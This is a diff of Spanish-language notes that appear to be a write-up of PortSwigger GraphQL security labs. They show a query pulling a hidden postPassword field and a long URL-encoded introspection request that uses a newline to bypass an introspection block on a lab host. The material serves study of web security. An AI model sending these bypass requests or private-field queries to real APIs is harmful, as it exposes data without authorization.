@@ -6,7 +6,7 @@ Utilizando la opción de "click derecho -> GraphQl -> Set Introspection Query". 
 
 ```
 {"query":"\nquery getBlogSummaries {\n    getBlogPost(id: 3) {\n        image\n        title\n        summary\n        id\n    postPassword\n}\n}","operationName":"getBlogSummaries"}
-`
+```
 
 ## Lab: Accidental exposure of private GraphQL fields
 
@@ -25,7 +25,7 @@ GET /$intruder$
 ``` 
 
 Luego bypaseamos las defensas que están cuando intentamos listar el schema, lo hacemos añadiendo un salto de linea URL-encode `%0A`
-```
+``
 GET /api?query=query+IntrospectionQuery+%7b%0a++++__schema%0A+%7b%0a++++++++queryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++subscriptionType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++types+%7b%0a++++++++++++...FullType%0a++++++++%7d%0a++++++++directives+%7b%0a++++++++++++name%0a++++++++++++description%0a++++++++++++locations%0a++++++++++++args+%7b%0a++++++++++++++++...InputValue%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d%0a%0afragment+FullType+on+__Type+%7b%0a++++kind%0a++++name%0a++++description%0a++++fields%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++args+%7b%0a++++++++++++...InputValue%0a++++++++%7d%0a++++++++type+%7b%0a++++++++++++...TypeRef%0a++++++++%7d%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++inputFields+%7b%0a++++++++...InputValue%0a++++%7d%0a++++interfaces+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++enumValues%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++possibleTypes+%7b%0a++++++++...TypeRef%0a++++%7d%0a%7d%0a%0afragment+InputValue+on+__InputValue+%7b%0a++++name%0a++++description%0a++++type+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++defaultValue%0a%7d%0a%0afragment+TypeRef+on+__Type+%7b%0a++++kind%0a++++name%0a++++ofType+%7b%0a++++++++kind%0a++++++++name%0a++++++++ofType+%7b%0a++++++++++++kind%0a++++++++++++name%0a++++++++++++ofType+%7b%0a++++++++++++++++kind%0a++++++++++++++++name%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d HTTP/2
 Host: 0a6600bb032ae3c9808cf82b005200b3.web-security-academy.net
 ```
